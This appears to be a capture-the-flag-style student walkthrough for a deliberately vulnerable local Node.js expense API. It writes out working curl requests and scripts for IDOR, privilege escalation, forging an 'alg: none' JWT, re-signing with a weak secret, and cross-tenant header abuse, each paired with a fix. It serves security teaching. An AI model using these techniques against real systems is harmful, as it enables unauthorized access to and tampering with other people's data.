# 🎯 Broken Access Control Lab — Complete Student Walkthrough

**Level:** Intermediate to Advanced  
**Time Required:** 2–4 hours (depending on pace)  
**Concepts Covered:** IDOR, Vertical Escalation, JWT Abuse, Attribute-Based Bypass, Multi-Tenant Security

---

## Table of Contents

1. [Setup & Getting Started](#setup--getting-started)
2. [Exercise 01: IDOR (Insecure Direct Object Reference)](#exercise-01-idor)
3. [Exercise 02: Vertical Privilege Escalation](#exercise-02-vertical-privilege-escalation)
4. [Exercise 03: JWT Abuse](#exercise-03-jwt-abuse)
5. [Exercise 04: Context/Attribute-Based Bypass](#exercise-04-context-based-bypass)
6. [Exercise 05: Multi-Tenant Isolation](#exercise-05-multi-tenant-isolation)
7. [Common Mistakes & Debugging](#common-mistakes--debugging)
8. [Real-World Examples](#real-world-examples)

---

## Setup & Getting Started

### Prerequisites & Tools

You'll need these tools to complete the lab:

| Tool | Purpose | Installed By Default? |
|------|---------|----------------------|
| **Node.js 14+** | Run the server & tests | Depends on OS |
| **npm** | Package management | Yes (with Node.js) |
| **curl** | Make HTTP requests | Yes (Linux/macOS) |
| **jq** | Parse JSON responses | No (see below) |
| **bash/zsh** | Shell for scripting | Yes (Linux/macOS) |
| **Text editor** | Read/edit code | Yes |

### Installation

**macOS:**
```bash
brew install node curl jq
```

**Ubuntu/Debian:**
```bash
sudo apt-get update
sudo apt-get install nodejs npm curl jq
```

**Windows (WSL2):**
```bash
apt-get update
apt-get install nodejs npm curl jq
```

**Then install lab dependencies:**
```bash
cd /home/appledev/labs/week5/broken-access-control-lab
npm install
```

### Verify Installation

```bash
npm start
```

You should see:
```
🚀  ExpenseTracker API running on http://localhost:3000
```

Press `Ctrl+C` to stop. ✅ Ready to start!

### User Accounts Available

| Username | Password | Role | Org |
|---|---|---|---|
| alice | password123 | user | default |
| bob | password123 | user | default |
| carol | password123 | manager | default |
| admin | adminpass | admin | default |

---

## Exercise 01: IDOR

### 🎓 Learning Goals

- Understand **Insecure Direct Object References** (horizontal privilege escalation)
- Learn why ID-based access alone is insufficient
- Practice writing ownership-checking middleware

### 📖 Concept Recap

**IDOR** = accessing a resource by its ID without verifying you own it.

```
GET /api/expenses/1   ✅ Your expense (Alice)
GET /api/expenses/4   ❌ Bob's expense (Alice accessing via guessed ID)
```

### 🔍 Phase 1: Reconnaissance

**Step 1 — Start the server:**
```bash
npm start
```

**Step 2 — In another terminal, get Alice's token:**
```bash
TOKEN=$(curl -s -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"password123"}' | jq -r .token)

echo "Alice's token: $TOKEN"
```

**Step 3 — Alice reads her own expense (should work):**
```bash
curl -s http://localhost:3000/api/expenses/1 \
  -H "Authorization: Bearer $TOKEN" | jq .
```

You'll see Alice's expense data. ✅

**Step 4 — Alice tries to read Bob's expense (ID 4):**
```bash
curl -s http://localhost:3000/api/expenses/4 \
  -H "Authorization: Bearer $TOKEN" | jq .
```

**Question:** What happened? Did you get a flag?

**Expected (Vulnerable):**
```json
{
  "data": {
    "id": 4,
    "ownerId": 2,
    "title": "...",
    "flag": "BAC{idor_read_unlocked}"
  }
}
```

🚩 **You found Bug #1!**

### ⚔️ Phase 2: Exploit

**Exploit A — IDOR Read (already found above)**

Try all Bob's expenses:
```bash
curl -s http://localhost:3000/api/expenses/5 \
  -H "Authorization: Bearer $TOKEN" | jq .
```

Record the flag: `BAC{idor_read_unlocked}`

---

**Exploit B — IDOR Write (modify Bob's data):**
```bash
curl -s -X PUT http://localhost:3000/api/expenses/4 \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"amount": 0.01, "title": "Hacked by Alice"}' | jq .
```

**Expected:**
```json
{
  "data": { "id": 4, "amount": 0.01, "..." },
  "flag": "BAC{idor_write_unlocked}"
}
```

Record the flag: `BAC{idor_write_unlocked}`

---

**Exploit C — IDOR Delete (delete Bob's expense):**
```bash
curl -s -X DELETE http://localhost:3000/api/expenses/5 \
  -H "Authorization: Bearer $TOKEN" | jq .
```

**Expected:**
```json
{
  "message": "Expense deleted.",
  "flag": "BAC{idor_delete_and_vertical_unlocked}"
}
```

Record the flag: `BAC{idor_delete_and_vertical_unlocked}`

---

### 🔧 Phase 3: Root Cause Analysis

Open `src/app.js` and find the vulnerable routes:

**Route #1: GET /api/expenses/:id**
```javascript
app.get(
  '/api/expenses/:id',
  verifyToken,
  requirePermission('expenses:read_own'),
  // requireOwnership(),  ← ⚠️ THIS IS MISSING!
  (req, res) => {
    const expense = findExpenseById(req.params.id);
    // ...returns expense without checking if you own it
  }
);
```

**Q:** Why is `requireOwnership()` commented out?  
**A:** This is the intentional bug. Permission checks ("are you logged in?") aren't enough; you also need ownership checks ("do you own this resource?").

---

**Route #2 & #3: PUT and DELETE**

Same issue — they're missing `requireOwnership()` too.

---

### 🛠️ Phase 4: Fix the Code

Open `src/app.js` and uncomment `requireOwnership()` on all three routes:

**GET /api/expenses/:id** — Line ~98:
```javascript
app.get(
  '/api/expenses/:id',
  verifyToken,
  requirePermission('expenses:read_own'),
  requireOwnership(),  // ← UNCOMMENT THIS
  (req, res) => {
    // ...
  }
);
```

**PUT /api/expenses/:id** — Line ~160:
```javascript
app.put(
  '/api/expenses/:id',
  verifyToken,
  requirePermission('expenses:update_own'),
  requireOwnership(),  // ← UNCOMMENT THIS
  (req, res) => {
    // ...
  }
);
```

**DELETE /api/expenses/:id** — Line ~188:
```javascript
app.delete(
  '/api/expenses/:id',
  verifyToken,
  requirePermission('expenses:read'),  // We'll fix this in Ex 02
  requireOwnership(),  // ← UNCOMMENT THIS
  (req, res) => {
    // ...
  }
);
```

---

### ✅ Phase 5: Verify

Run the test suite:

```bash
npm run test:01
```

**Expected before fix:**
```
✓ 🔴 [EXPLOIT] Alice can read Bob's expense
✓ 🔴 [EXPLOIT] Alice can modify Bob's expense
✗ 🟢 [HARDENING] User cannot read Bob's expense
```

**Expected after fix:**
```
✗ 🔴 [EXPLOIT] Alice can read Bob's expense  (should fail now!)
✗ 🔴 [EXPLOIT] Alice can modify Bob's expense
✓ 🟢 [HARDENING] User cannot read Bob's expense
✓ 🟢 [HARDENING] User cannot modify Bob's expense
✓ 🟢 [HARDENING] Ownership check prevents unauthorized read
```

---

## Exercise 02: Vertical Privilege Escalation

### 🎓 Learning Goals

- Understand **privilege escalation** (going "up" in authority)
- Learn the difference between RBAC (role-based) and actual enforcement
- Practice auditing permission checks across routes

### 📖 Concept Recap

| Type | Example |
|---|---|
| **Horizontal** (Ex 01) | Alice reads Bob's data (same role) |
| **Vertical** (Ex 02) | Alice (user) reads admin data |

### 🔍 Phase 1: Reconnaissance

Get Alice's token:
```bash
TOKEN=$(curl -s -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"password123"}' | jq -r .token)
```

Check Alice's role:
```bash
node -e "console.log(JSON.parse(Buffer.from('$TOKEN'.split('.')[1], 'base64url').toString()))"
# Output: { userId: 1, role: 'user', iat: ... }
```

Alice is role: `user`. What can she NOT do?

Open `src/roles.js` and see what permissions each role has:
- `user` — can read/write/delete their OWN expenses
- `manager` — can read/write/approve ALL expenses
- `admin` — can do EVERYTHING including manage users

### 🚨 Bug #4: Missing Permission Check on Admin Route

**Try to access the admin user list as Alice:**
```bash
curl -s http://localhost:3000/api/admin/users \
  -H "Authorization: Bearer $TOKEN" | jq .
```

**Expected (Vulnerable):**
```json
{
  "data": [
    { "id": 1, "username": "alice", "role": "user" },
    { "id": 2, "username": "bob", "role": "user" },
    ...
  ],
  "flag": "BAC{vertical_escalation_no_permission_check}"
}
```

🚩 **You found Bug #4!** Alice (a regular user) can see the entire user database!

---

### 🚨 Bug #5: Wrong Permission String on Delete Route

The DELETE endpoint uses the wrong permission. Let's check:

**Open `src/app.js`** and look at the DELETE route (line ~188):
```javascript
app.delete(
  '/api/expenses/:id',
  verifyToken,
  requirePermission('expenses:read'),  // ⚠️ Wrong permission!
  // Should be 'expenses:delete_own'
  (req, res) => {
    // ...
  }
);
```

**Check `src/roles.js`:** Does role `user` have `expenses:read`?  
**Answer:** Yes! All users have this (for reporting/viewing all expenses).

So Alice can delete any expense because:
1. She has `expenses:read` ✅
2. The permission check passes ✅
3. `requireOwnership()` was missing (fixed in Ex 01) ✅

But the real bug is **the permission string is wrong**. It should check for `expenses:delete_own`.

**Try to delete your own expense (should work):**
```bash
curl -s -X DELETE http://localhost:3000/api/expenses/1 \
  -H "Authorization: Bearer $TOKEN" | jq .
```

**Expected (before fixing Bug #5):**
```json
{
  "message": "Expense deleted.",
  "flag": "BAC{idor_delete_and_vertical_unlocked}"
}
```

😱 **A regular user can delete!** This is Bug #5.

---

### 🚨 Bug #6: Manual Role Check Blocks Managers

**Get Carol's token (manager):**
```bash
CAROL_TOKEN=$(curl -s -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"carol","password":"password123"}' | jq -r .token)
```

**Try to approve an expense as Carol:**
```bash
curl -s -X POST http://localhost:3000/api/expenses/approve/1 \
  -H "Authorization: Bearer $CAROL_TOKEN" \
  -H "Content-Type: application/json" | jq .
```

**Expected (Vulnerable):**
```json
{
  "error": "Access Denied",
  "note": "Only admins can approve. (But should managers be able to? The PERMISSIONS map says yes...)",
  "flag": "BAC{manual_role_check_bypasses_permission_system}"
}
```

🚩 **Bug #6 found!** The code does `if (req.user.role !== 'admin')` but should use the permission system, which says both `manager` AND `admin` can approve.

**Open `src/app.js`** line ~220:
```javascript
if (req.user.role !== 'admin') {
  // ⚠️ This blocks managers too!
  return res.status(403).json({ error: 'Access Denied' });
}
```

---

### 🛠️ Phase 2: Fix the Code

**Fix Bug #4 — Add missing permission check:**

Line ~330, add the permission middleware:
```javascript
app.get(
  '/api/admin/users',
  verifyToken,
  requirePermission('users:read'),  // ← ADD THIS LINE
  (req, res) => {
    // ...
  }
);
```

---

**Fix Bug #5 — Use correct permission string:**

Line ~188, change the permission:
```javascript
app.delete(
  '/api/expenses/:id',
  verifyToken,
  requirePermission('expenses:delete_own'),  // ← CHANGE THIS
  requireOwnership(),
  (req, res) => {
    // ...
  }
);
```

---

**Fix Bug #6 — Replace manual check with middleware:**

Line ~220–232, replace:
```javascript
// BEFORE:
(req, res, next) => {
  if (req.user.role !== 'admin') {
    return res.status(403).json({ error: 'Access Denied' });
  }
  next();
},

// AFTER:
requirePermission('expenses:approve'),  // ← Replace with this
```

---

### ✅ Phase 3: Verify

```bash
npm run test:02
```

You should see exploit tests fail (bugs fixed) and hardening tests pass.

---

## Exercise 03: JWT Abuse

### 🎓 Learning Goals

- Understand JWT structure and common vulnerabilities
- Learn about algorithm confusion attacks
- Practice identifying weak cryptographic implementations

### 📖 Concept Recap

**JWT Format:** `header.payload.signature`

```
eyJhbGciOiJIUzI1NiJ9  ← {"alg":"HS256"}
.eyJ1c2VySWQiOjEfcm9sZSI6InVzZXIifQ  ← {"userId":1,"role":"user"}
.SflKxwRJ...  ← HMAC signature
```

The server signs with a secret. On each request, it verifies the signature.

### ⚔️ Attack A: Algorithm Confusion (`alg: none`)

**Concept:** If `alg` is set to `none`, the token has **no signature** — just `header.payload.`

A vulnerable server that doesn't whitelist algorithms will accept it.

**Craft an unsigned admin token:**
```bash
node -e "
const header  = Buffer.from(JSON.stringify({alg:'none',typ:'JWT'})).toString('base64url');
const payload = Buffer.from(JSON.stringify({userId:99,role:'admin',iat:Math.floor(Date.now()/1000)})).toString('base64url');
const token   = header + '.' + payload + '.';
console.log(token);
"
```

Copy the output. Let's call it `FORGED_TOKEN`.

**Use the forged token:**
```bash
FORGED_TOKEN="<paste output from above>"

curl -s http://localhost:3000/api/admin/users \
  -H "Authorization: Bearer $FORGED_TOKEN" | jq .
```

**Expected (Vulnerable):**
```json
{
  "data": [...users...],
  "flag": "BAC{jwt_alg_none_accepted}"
}
```

🚩 **Bug #7 found!** The server accepted an unsigned token!

---

### ⚔️ Attack B: Weak Secret Cracking

**Step 1 — Extract the real JWT secret**

Look at `src/auth.js`:
```javascript
const JWT_SECRET = 'secret';
```

😱 The secret is hardcoded as `"secret"` — trivially easy to crack!

**Step 2 — Re-sign a token with the cracked secret:**
```bash
node -e "
const jwt = require('jsonwebtoken');
const SECRET = 'secret';
const payload = { userId: 99, role: 'admin' };
const token = jwt.sign(payload, SECRET, { algorithm: 'HS256' });
console.log(token);
"
```

Copy the output. Let's call it `CRACKED_TOKEN`.

**Step 3 — Use the re-signed token:**
```bash
CRACKED_TOKEN="<paste output>"

curl -s http://localhost:3000/api/admin/users \
  -H "Authorization: Bearer $CRACKED_TOKEN" | jq .
```

**Expected (Vulnerable):**
```json
{
  "data": [...users...],
  "flag": "BAC{jwt_weak_secret_cracked}"
}
```

🚩 **Bug #8 found!** The secret is too weak to prevent cracking!

---

### 🛠️ Phase 2: Fix the Code

**Fix Bug #7 — Whitelist allowed algorithms:**

Open `src/auth.js` and find the `verifyToken()` function (line ~60):

**BEFORE:**
```javascript
const decoded = jwt.verify(token, JWT_SECRET);  // No algorithm restriction!
```

**AFTER:**
```javascript
const decoded = jwt.verify(token, JWT_SECRET, { algorithms: ['HS256'] });
```

This rejects `alg: none` tokens.

---

**Fix Bug #8 — Use a strong secret:**

Line ~9:
```javascript
// BEFORE:
const JWT_SECRET = 'secret';

// AFTER:
const JWT_SECRET = process.env.JWT_SECRET || 'use-strong-random-secret-in-production';
// Or better: require a strong secret via env var only
```

In production, this should come from environment variables or a secrets management system.

---

### ✅ Phase 3: Verify

```bash
npm run test:03
```

---

## Exercise 04: Context/Attribute-Based Bypass

### 🎓 Learning Goals

- Understand how batch operations can bypass authorization
- Learn the importance of per-item validation
- Practice identifying authorization bypasses in loops/queries

### 📖 Concept Recap

**Simple Access Check:**
```
If (user role === admin) { show admin data }
```

**Query-Based Check (Easy to bypass):**
```
SELECT * FROM expenses WHERE category = 'travel'  // No ownership filter!
```

**Proper ABAC Check:**
```
SELECT * FROM expenses WHERE category = 'travel' AND ownerId = currentUser
```

### 🔍 Recon

Get Alice's token:
```bash
TOKEN=$(curl -s -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"password123"}' | jq -r .token)
```

### ⚔️ Phase 1: Exploit Search

**Alice searches for travel expenses:**
```bash
curl -s "http://localhost:3000/api/expenses/search?category=travel" \
  -H "Authorization: Bearer $TOKEN" | jq .
```

**Question:** Does the result include Bob's travel expenses?

**Expected (Vulnerable):**
```json
{
  "data": [
    { "id": 1, "category": "travel", "ownerId": 1, "title": "..." },  // Alice's
    { "id": 4, "category": "travel", "ownerId": 2, "title": "..." },  // Bob's ← shouldn't be here!
  ],
  "flag": "BAC{search_no_ownership_filter}"
}
```

🚩 **Bug #9!** Search results aren't filtered by ownership.

---

### ⚔️ Phase 2: Exploit Bulk Update

**Alice tries to bulk-update Bob's expenses:**
```bash
curl -s -X POST http://localhost:3000/api/expenses/bulk-update \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"ids":[4,5],"status":"approved"}' | jq .
```

**Expected (Vulnerable):**
```json
{
  "results": [
    { "id": 4, "success": true },  // Bob's ← shouldn't work!
    { "id": 5, "success": true }
  ],
  "flag": "BAC{bulk_update_no_item_checks}"
}
```

🚩 **Bug #10!** Bulk operations don't check ownership per item.

---

### ⚔️ Phase 3: Exploit Bulk Delete by Category

**Alice deletes all "misc" expenses:**
```bash
curl -s -X DELETE "http://localhost:3000/api/expenses/category/misc" \
  -H "Authorization: Bearer $TOKEN" | jq .
```

**Expected (Vulnerable):**
```json
{
  "deleted": 5,
  "results": [
    { "id": 1, "ownerId": 1 },  // Alice's
    { "id": 4, "ownerId": 2 }   // Bob's ← shouldn't be deleted!
  ],
  "flag": "BAC{bulk_delete_no_item_checks}"
}
```

🚩 **Bug #11!** Bulk category delete doesn't check ownership.

---

### 🛠️ Phase 2: Fix the Code

**All three bugs have the same root cause:** Operations that loop over multiple items only check authorization once, not per item.

**Pattern to fix:**
```javascript
// VULNERABLE:
requirePermission('expenses:read');  // Checked once
const expenses = getAllExpenses();   // But no per-item ownership!

// FIXED:
const expenses = getAllExpenses()
  .filter(exp => exp.ownerId === req.user.userId);
```

Find these three routes in `src/app.js` and add ownership filters.

---

### ✅ Verify

```bash
npm run test:04
```

---

## Exercise 05: Multi-Tenant Isolation

### 🎓 Learning Goals

- Understand multi-tenant architecture and isolation issues
- Learn why org context must not be user-controlled
- Practice identifying cross-tenant data leaks

### 📖 Concept Recap

```
Traditional app:    Can I (user) access this (resource)?
Multi-tenant app:   Can I (user in org A) access this (resource in org B)?
```

If org context is user-controlled or not re-validated, tenants leak data to each other.

### ⚔️ Attack A: Org Context Header Manipulation

**Create two orgs:**
```bash
# Alice's org
ORG_A=$(curl -s -X POST http://localhost:3000/api/org/setup \
  -H "Authorization: Bearer $ALICE_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"orgName":"AliceCorp"}' | jq -r .org.id)

# Bob's org
ORG_B=$(curl -s -X POST http://localhost:3000/api/org/setup \
  -H "Authorization: Bearer $BOB_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"orgName":"BobCorp"}' | jq -r .org.id)

echo "Alice's org: $ORG_A, Bob's org: $ORG_B"
```

**Alice tries to access Bob's org by manipulating the header:**
```bash
curl -s http://localhost:3000/api/expenses \
  -H "Authorization: Bearer $ALICE_TOKEN" \
  -H "X-Org-Id: $ORG_B" | jq .
```

**Expected (Vulnerable):**
```json
{
  "data": [ ... Bob's expenses ...],
  "flag": "BAC{cross_org_no_context_validation}"
}
```

🚩 **Bug #12!** The server trusts the `X-Org-Id` header!

---

### ⚔️ Attack B: First-User Admin Escalation

**Alice sets up her first org (OK):**
```bash
curl -s -X POST http://localhost:3000/api/org/setup \
  -H "Authorization: Bearer $ALICE_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"orgName":"AliceOrg1"}' | jq .
```

Result: Alice is org admin ✅

**Alice sets up a SECOND org (should fail!):**
```bash
curl -s -X POST http://localhost:3000/api/org/setup \
  -H "Authorization: Bearer $ALICE_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"orgName":"AliceOrg2"}' | jq .
```

**Expected (Vulnerable):**
```json
{
  "org": { "id": "...", "admin": { "id": 1, "username": "alice" } },
  "flag": "BAC{org_setup_no_admin_validation}"
}
```

🚩 **Bug #13!** No validation that you're already an admin elsewhere!

---

### ⚔️ Attack C: Unvalidated Org Invite

**Bob tries to invite himself to Alice's org as admin:**
```bash
curl -s -X POST http://localhost:3000/api/org/invite \
  -H "Authorization: Bearer $BOB_TOKEN" \
  -H "X-Org-Id: $ORG_A" \
  -H "Content-Type: application/json" \
  -d '{"username":"bob","role":"org_admin"}' | jq .
```

**Expected (Vulnerable):**
```json
{
  "user": { "id": 2, "role": "org_admin", "orgId": "..." },
  "flag": "BAC{org_invite_no_authorization}"
}
```

🚩 **Bug #14!** No check that Bob should be allowed to do this!

---

### 🛠️ Phase 2: Fix the Code

**Fix Bug #12 — Never trust user-controlled org context:**

Find all routes that read `X-Org-Id` and **delete** that code. Use the JWT's org ID only:

```javascript
// VULNERABLE:
const orgId = req.headers['x-org-id'] || req.user.orgId;

// FIXED:
const orgId = req.user.orgId;  // JWT only!
```

---

**Fix Bugs #13 & #14 — Validate setup/invite permissions:**

```javascript
// Fix #13 — Only allow setup once per user
app.post('/api/org/setup', verifyToken, (req, res) => {
  // Check user isn't already org_admin elsewhere
  if (req.user.role === 'org_admin') {
    return res.status(400).json({
      error: 'User is already an org admin'
    });
  }
  // ... create org
});

// Fix #14 — Only org admins can invite
app.post('/api/org/invite', verifyToken, (req, res) => {
  // Must be org admin for this org
  if (req.user.role !== 'org_admin' || req.user.orgId !== req.body.targetOrgId) {
    return res.status(403).json({ error: 'Not authorized' });
  }
  // ... invite user
});
```

---

### ✅ Verify

```bash
npm run test:05
```

---

## Common Mistakes & Debugging

### ❌ "I fixed the code but tests still fail"

**Common causes:**

1. **Didn't restart the server** — Jest caches modules. Kill the server, restart, and re-run tests.
   ```bash
   npm run test:01  # Will start its own server
   ```

2. **Mixed up which lines to edit** — Use `grep` to search:
   ```bash
   grep -n "requireOwnership" src/app.js
   ```

3. **Syntax error in edited file** — Run the server to check:
   ```bash
   npm start  # Will show syntax errors
   ```

---

### ❌ "The token I crafted doesn't work"

**Debug JWT tokens:**

```bash
# Decode a token (without verifying signature)
TOKEN="your_token_here"
node -e "
  const parts = '$TOKEN'.split('.');
  console.log('Header:', JSON.parse(Buffer.from(parts[0], 'base64url').toString()));
  console.log('Payload:', JSON.parse(Buffer.from(parts[1], 'base64url').toString()));
"
```

---

### ❌ "I can't find the vulnerable code"

**Search techniques:**

```bash
# Find all routes with a certain path
grep -n "app.get.*admin" src/app.js

# Find all uses of a middleware
grep -n "requirePermission" src/app.js

# Find lines with specific strings
grep -n "requireOwnership" src/app.js
```

---

### ❌ "The curl command returns 'Invalid JSON'"

**Try adding `jq` error handling:**

```bash
curl -s http://localhost:3000/api/expenses/1 \
  -H "Authorization: Bearer $TOKEN" | jq . 2>&1
```

Or just view raw response:
```bash
curl -v http://localhost:3000/api/expenses/1 \
  -H "Authorization: Bearer $TOKEN"
```

---

## Real-World Examples

### Example 1: GitHub Organizations

**Vulnerability:** If GitHub didn't validate org context, you could:
- Access another org's repositories by changing an `org_id` header
- Change another user's role in an org you don't belong to
- View organization secrets/billing

**Fix:** GitHub stores org membership server-side and validates on every request.

---

### Example 2: Slack Workspaces

**Vulnerability:** If Slack's multi-tenant isolation was weak:
- Search results from other workspaces would leak
- Bulk actions (delete channels) might affect wrong workspace
- First user to invite others becomes admin without validation

**Fix:** Slack has strict per-workspace isolation and role validation.

---

### Example 3: AWS IAM

**Vulnerability:** If AWS trusted client-provided account IDs:
- You could access any AWS account
- Manipulate IAM policies in other accounts
- Retrieve secrets cross-account

**Fix:** AWS uses cryptographic principals and server-side validation.

---

## Summary: Key Takeaways

| Concept | Vulnerability | Fix |
|---|---|---|
| **ID-based access** | IDOR (no ownership check) | Add `requireOwnership()` middleware |
| **Permission middleware** | Applied incorrectly or missing | Use centralized PERMISSIONS registry |
| **JWT handling** | Weak secrets, algorithm confusion | Whitelist algorithms, use strong secrets |
| **Batch operations** | Only check once, not per item | Validate ownership on each iteration |
| **Multi-tenant context** | User-controlled or assumed static | Validate server-side on every request |

---

## Additional Resources

- OWASP: [A01:2021 – Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- PortSwigger: [Access Control Vulnerabilities](https://portswigger.net/web-security/access-control)
- OAuth 2.0 RFC: [RFC 6749](https://tools.ietf.org/html/rfc6749)
- JWT Best Practices: [RFC 8725](https://tools.ietf.org/html/rfc8725)

---

**Happy hacking!** 🔐

